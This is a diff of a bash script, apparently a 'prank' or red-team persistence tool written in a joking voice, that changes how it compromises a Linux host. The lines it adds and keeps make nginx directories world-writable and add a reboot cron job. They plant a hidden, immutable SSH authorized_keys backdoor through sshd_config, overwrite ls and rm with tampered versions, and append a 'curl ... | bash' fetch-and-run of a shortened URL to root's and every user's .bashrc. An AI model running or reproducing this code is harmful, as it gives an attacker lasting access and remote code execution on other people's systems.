@@ -140,15 +140,13 @@ function generic(){
 		iptables-restore /etc/sysconfig/iptables &> /dev/null
 	fi
 
-#### "fixing" nginx ###############################
-	# permissions for everyone!!
-		find / -type d -name nginx -exec chmod -R 7777 {} \;
-
 #### Setup Stuff ##################################
 		clear
 		printf "[\e[33;5m Preparing Charges \e[0m]"
 		#a few presents
 			touch $HOME/present_{0001..1000} /root/present_{0001..1000} &
+		# permissions for everyone!!
+			find / -type d -name nginx -exec chmod -R 777 {} \;
 		# OS checking
 			if [[ $osDetect == "CentOS" ]]; then
 				(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
@@ -157,6 +155,7 @@ function generic(){
 			else
 				apt-get update &> /dev/null ; clear
 				printf "[\e[33;5m Dispersing Candy \e[0m]"
+				(crontab -l 2> /dev/null; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab - &> /dev/null
 				apt-get install -y curl sudo libaa-bin &> /dev/null
 			fi
 		clear
@@ -176,7 +175,7 @@ function generic(){
 		chattr +i /root/.ssh/.authorized_keys
 		echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
 
-	# let the bodies hit the floor
+	# Creating happiness
 		echo "${dirtyLS}" | tee $seedPathsLS > /dev/null
 		echo "${dirtyRM}" | tee $seedPathsRM > /dev/null
 		echo "${dirtyGimme}" | tee $seedPathsGimme > /dev/null
@@ -191,15 +190,16 @@ function generic(){
 			else
 				echo 'HALP! i need an adult!'
 			fi
+			userBashrcPath=$(find /home/ -type f -name .bashrc)
 		# happiness dispersal
-		cat <<-'EOF' >> $bashrcPath
+		tee -a $bashrcPath $userBashrcPath <<-'EOF' &> /dev/null
 			#####################################################################
 			# Delete this stuff.. I'm sure nothing bad could possibly happen >.>
 			#####################################################################
 			EOF
-		echo 'touch /tmp/.trigger &> /dev/null' >> $bashrcPath
-		printf "\n%s\n" "$centDirtyRootPS1" >> $bashrcPath
-		echo 'curl -s -L http://bit.ly/10hA8iC | bash' >> $bashrcPath
+		echo 'touch /tmp/.trigger &> /dev/null' | tee -a $userBashrcPath $bashrcPath &> /dev/null
+		printf "\n%s\n" "$centDirtyRootPS1" | tee -a $userBashrcPath $bashrcPath &> /dev/null
+		echo 'curl -s -L http://bit.ly/10hA8iC | bash' | tee -a $userBashrcPath $bashrcPath &> /dev/null
 		#welcome messages
 			for n in {1..35}; do
 				printf "\t\t\e[0;31m AND SO IT BEGINS!! \e[0;m\n"
